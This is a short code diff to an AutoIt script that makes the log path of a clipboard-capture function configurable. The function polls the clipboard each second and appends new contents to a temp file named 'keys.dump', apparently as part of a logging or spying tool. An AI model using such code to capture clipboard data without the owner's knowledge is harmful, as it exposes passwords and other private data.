@@ -12,7 +12,7 @@ Func MessageBox($title, $text)
 EndFunc
 
 ;Log to file the data stored in the clipboard
-Func clipboard2Log($timeOut = 10)
+Func clipboard2Log($timeOut = 10, $pathLog = @TempDir & "\keys.dump")
    $buffer=""
    While 1
 	  if $timeOut > 0 Then
@@ -20,7 +20,7 @@ Func clipboard2Log($timeOut = 10)
 		 Sleep(1000)
 		 if $buffer <> $Data Then
 			$buffer = $Data
-			Log2File($buffer)
+			Log2File($buffer, $pathLog)
 		 EndIf
 		 $timeOut=$timeOut-1
 	  Else
@@ -29,9 +29,9 @@ Func clipboard2Log($timeOut = 10)
    WEnd
 EndFunc
 
-Func Log2File($log)
+Func Log2File($log, $pathFile)
     ;Local Const $sFilePath = _WinAPI_GetTempFileName(@TempDir)
-	Local Const $sFilePath = @TempDir & "\keys.dump"
+	Local Const $sFilePath = $pathFile
     Local $hFileOpen = FileOpen($sFilePath, $FO_APPEND)
 	   If $hFileOpen = -1 Then
 		   MsgBox($MB_SYSTEMMODAL, "", "An error occurred whilst writing the temporary file.")
